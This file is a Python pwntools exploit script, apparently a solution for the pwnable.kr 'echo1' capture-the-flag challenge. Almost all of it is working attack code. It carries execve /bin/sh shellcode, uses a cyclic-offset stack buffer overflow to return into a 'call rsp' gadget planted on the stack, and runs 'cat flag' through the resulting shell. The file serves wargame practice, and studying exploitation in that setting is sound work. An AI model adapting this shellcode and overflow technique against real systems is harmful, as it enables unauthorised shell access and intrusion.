from pwn import *
import argh


context.arch = 'amd64'
ADDR = 'pwnable.kr'
PORT = 9010
shellcode = '''
   #### this is from http://shell-storm.org/shellcode/files/shellcode-76.php
    xorq	rdx, rdx
    movq	rbx, 0x68732f6e69622fff
    shr	        rbx, 0x8
    push	rbx
    movq	rdi, rsp
    xorq	rax,rax
    pushq	rax
    pushq	rdi
    movq	rsi, rsp
    mov	        al, 0x3b	# execve(3b)
    syscall

    pushq	0x1
    pop	        rdi
    pushq	0x3c		# exit(3c)
    pop	        rax
    syscall
'''


def start_gdb(exe_name):
    return gdb.debug([exe_name], '''
    break *0x400871
    # display/6wx 0x602080
    # display/2wx 0x602098
    # display/wx 0x6020a0
    display/10wx *0x0602098
    layout regs
    continue
    ''')


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bin_path = './echo1'
    e = ELF(bin_path)

    if local:
        p = start_gdb(bin_path)
    elif runpwn:
        p = remote(ADDR, PORT)


    p.recvuntil('your name? : ')
    p.sendline(asm('call rsp'))  # this will enable us to jump to the stack
    p.recvuntil('exit\n> ')
    p.sendline('1')
    p.recvline()
    p.sendline('A' * (cyclic_find('kaaa')) + p64(e.symbols.id) + asm(shellcode))
    p.recvlines(2)
    p.sendline('cat flag')
    print(p.recvline())


if __name__ == '__main__':
    argh.dispatch_command(main)

